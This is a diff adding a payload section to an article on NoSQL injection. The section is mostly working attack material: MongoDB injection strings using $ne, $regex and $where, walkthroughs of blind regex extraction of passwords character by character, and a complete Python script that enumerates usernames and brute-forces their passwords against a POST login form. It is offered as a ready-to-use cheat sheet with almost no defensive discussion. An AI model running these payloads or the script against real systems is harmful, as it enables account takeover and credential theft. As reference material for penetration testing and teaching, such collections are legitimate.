@@ -48,3 +48,129 @@ NoSQL databases have revolutionized the way data is stored and processed in mode
 
 
 ### Payloads for NoSQL 
+
+**SQL - Mongo**
+```
+Normal sql: ' or 1=1-- -
+Mongo sql: ' || 1==1//    or    ' || 1==1%00
+
+```
+
+**Extract Length Information**
+```
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
+# True if the length equals 1,3...
+
+```
+
+**Extract Data Information**
+```
+in URL (if length == 3)
+username[$ne]=toto&password[$regex]=a.{2}
+username[$ne]=toto&password[$regex]=b.{2}
+...
+username[$ne]=toto&password[$regex]=m.{2}
+username[$ne]=toto&password[$regex]=md.{1}
+username[$ne]=toto&password[$regex]=mdp
+
+username[$ne]=toto&password[$regex]=m.*
+username[$ne]=toto&password[$regex]=md.*
+
+in JSON
+{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+
+```
+
+**SQL - Mongo**
+```
+/?search=admin' && this.password%00 --> Check if the field password exists
+/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
+/?search=admin' && this.password && this.password.match(/^a.*$/)%00
+/?search=admin' && this.password && this.password.match(/^b.*$/)%00
+/?search=admin' && this.password && this.password.match(/^c.*$/)%00
+...
+/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
+...
+/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
+
+```
+
+**MongoDB Payloads**
+
+```
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+
+```
+
+**Brute Force Login Username and Passwords from POST Login**
+
+```
+import requests
+import string
+
+url = "http://example.com"
+headers = {"Host": "exmaple.com"}
+cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
+possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
+def get_password(username):
+    print("Extracting password of "+username)
+    params = {"username":username, "password[$regex]":"", "login": "login"}
+    password = "^"
+    while True:
+        for c in possible_chars:
+            params["password[$regex]"] = password + c + ".*"
+            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
+            if int(pr.status_code) == 302:
+                password += c
+                break
+        if c == possible_chars[-1]:
+            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
+            return password[1:].replace("\\", "")
+
+def get_usernames():
+    usernames = []
+    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
+    for c in possible_chars:
+        username = "^" + c
+        params["username[$regex]"] = username + ".*"
+        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
+        if int(pr.status_code) == 302:
+            print("Found username starting with "+c)
+            while True:
+                for c2 in possible_chars:
+                    params["username[$regex]"] = username + c2 + ".*"
+                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
+                        username += c2
+                        print(username)
+                        break
+
+                if c2 == possible_chars[-1]:
+                    print("Found username: "+username[1:])
+                    usernames.append(username[1:])
+                    break
+    return usernames
+
+
+for u in get_usernames():
+    get_password(u)
+
+```
